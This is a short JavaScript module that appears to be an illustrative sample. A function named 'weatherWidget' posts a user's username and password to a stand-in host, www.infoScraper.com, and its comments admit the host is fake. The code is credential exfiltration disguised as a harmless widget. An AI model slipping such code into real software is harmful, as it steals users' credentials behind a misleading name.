const axios = require('axios')

const weatherWidget = (usr) => {
  // This wouldn't work because this website isn't real, but it is a valid API request using the Axios package!
  axios.post('www.infoScraper.com', { username: usr.username, password: usr.password }).catch(() => {
    console.info('Nothing really happened because that is a fake website (I hope)')
  })

  return {
    message: 'success',
    statusCode: 200,
    detail: `Credentials ${usr.username} ${usr.password} successfully posted to www.infoScraper.com`
  }
}

export default weatherWidget
